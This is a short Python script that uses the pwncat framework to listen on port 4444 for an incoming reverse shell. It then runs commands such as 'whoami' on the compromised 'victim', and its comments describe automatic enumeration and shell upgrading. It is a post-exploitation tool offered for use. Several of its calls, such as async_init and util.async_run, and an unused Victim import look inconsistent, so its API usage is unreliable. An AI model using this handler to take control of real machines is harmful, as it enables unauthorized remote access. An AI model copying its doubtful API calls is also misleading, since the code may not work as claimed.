import asyncio
from pwncat import manager, util
from pwncat.victim import Victim

async def handle_connection():
    # Initialize the pwncat state/database
    await manager.HostManager().async_init()

    # Define the listener arguments
    # Equivalent to 'pwncat-cs -lp 4444'
    host = "0.0.0.0"
    port = 4444
    protocol = "tcp"

    print(f"Starting listener on {host}:{port}...")

    # Start a listener and wait for a connection
    # The 'manager.connect' function can also be used for client connections
    try:
        session = await manager.Manager().connect(
            f"{protocol}://{host}:{port}",
            listen=True
        )
    except Exception as e:
        print(f"Failed to establish connection: {e}")
        return

    print(f"Connection established! Session ID: {session.id}")
    print("Enumerating remote system and upgrading shell...")

    # The pwncat framework automatically performs enumeration and attempts 
    # to spawn a pseudo-terminal (pty) after connection.

    # You can now interact with the session programmatically
    # For example, run a command and get the output
    try:
        whoami_result = await session.run("whoami", wait_for_output=True)
        print(f"Remote user is: {whoami_result.stdout.strip()}")
        
        # Example of running a module
        # This requires the module file to be present in the pwncat module path
        # Example (uncomment and replace with actual module name if needed):
        # await session.run("run my_custom_module") 

    except Exception as e:
        print(f"Error during command execution: {e}")

    # Keep the session running (e.g., to allow interactive use later or background tasks)
    # The script will likely exit if the connection is closed.

def main():
    # Run the asynchronous function
    util.async_run(handle_connection())

if __name__ == "__main__":
    main()
